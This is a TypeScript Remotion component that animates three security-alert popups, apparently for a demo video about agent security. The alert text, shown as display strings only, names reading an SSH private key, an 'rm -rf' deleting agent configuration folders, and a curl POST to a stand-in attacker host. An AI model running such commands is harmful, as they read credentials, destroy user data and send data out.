import { interpolate, useCurrentFrame } from 'remotion'
import { fonts } from '../lib/fonts'
import { colors } from '../lib/colors'

const ITEMS = [
  {
    title: 'Unauthorized data access',
    body: 'Process 4729 read /home/$USER/.ssh/id_ed25519',
    severity: 'breach',
    tone: colors.red,
  },
  {
    title: 'Destructive command',
    body: 'rm -rf ~/.agents ~/.config/skill-organizer',
    severity: 'fatal',
    tone: colors.rose,
  },
  {
    title: 'Outbound transfer',
    body: 'curl -X POST https://attacker.example/x',
    severity: 'warn',
    tone: colors.amber,
  },
] as const

export const AlertPopups: React.FC<{ start: number }> = ({ start }) => {
  const frame = useCurrentFrame()
  if (frame < start) return null
  return (
    <div style={{ position: 'absolute', inset: 0, pointerEvents: 'none' }}>
      {ITEMS.map((it, i) => {
        const t = frame - start - i * 20
        if (t < 0) return null
        const slide = interpolate(t, [0, 12], [400, 0], { extrapolateRight: 'clamp' })
        const opacity = interpolate(t, [0, 8, 80, 100], [0, 1, 1, 0], { extrapolateRight: 'clamp' })
        if (opacity <= 0) return null
        return (
          <div
            key={it.title}
            style={{
              position: 'absolute',
              top: 60 + i * 140,
              right: 40,
              transform: `translateX(${slide}px)`,
              opacity,
              width: 340,
              padding: '14px 18px',
              background: 'rgba(7, 11, 21, 0.96)',
              border: `1px solid ${it.tone}`,
              borderRadius: 12,
              fontFamily: fonts.code,
              boxShadow: `0 18px 50px rgba(0,0,0,0.6), 0 0 24px ${it.tone}55`,
            }}
          >
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: 10,
                fontFamily: fonts.display,
                fontSize: 12,
                letterSpacing: '0.18em',
                textTransform: 'uppercase',
                color: it.tone,
                fontWeight: 700,
                marginBottom: 6,
              }}
            >
              <span
                style={{
                  display: 'inline-block',
                  width: 8,
                  height: 8,
                  borderRadius: '50%',
                  background: it.tone,
                  boxShadow: `0 0 10px ${it.tone}`,
                }}
              />
              {it.severity}
            </div>
            <div style={{ fontSize: 16, fontWeight: 600, color: colors.text, marginBottom: 4 }}>
              {it.title}
            </div>
            <div style={{ fontSize: 13, color: 'rgba(197, 211, 229, 0.78)' }}>{it.body}</div>
          </div>
        )
      })}
    </div>
  )
}
